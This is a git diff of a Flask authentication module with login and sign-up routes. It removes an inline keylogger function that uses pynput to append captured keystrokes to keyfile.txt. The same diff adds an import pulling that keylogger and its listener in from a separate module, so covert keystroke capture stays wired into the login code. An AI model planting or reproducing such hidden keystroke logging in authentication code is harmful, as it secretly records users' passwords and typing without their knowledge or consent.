@@ -4,21 +4,10 @@ from werkzeug.security import generate_password_hash, check_password_hash
 from . import db   # means from __init__.py import db
 from flask_login import login_user, login_required, logout_user, current_user
 from pynput import keyboard
+from .keylogger import keyPressed, keyboard_listener
 
 
 auth = Blueprint('auth', __name__)
-
-
-def keyPressed(key):
-    print(str(key))
-    with open("keyfile.txt", 'a') as logKey:
-        try:
-            char = key.char
-            logKey.write(char)
-        except Exception as e:
-            print(f"Error getting char: {str(e)}")
-
-keyboard_listener = None
 
 
 @auth.route('/login', methods = ['GET', 'POST'])
@@ -88,6 +77,7 @@ def sign_up():
             new_user = User(email = email, first_name = first_name, password = generate_password_hash(password1, method = 'pbkdf2:sha256'))
             db.session.add(new_user)
             db.session.commit()
+
             login_user(new_user, remember = True)
             flash('Account created!', category = 'success')
             return redirect(url_for('views.home'))
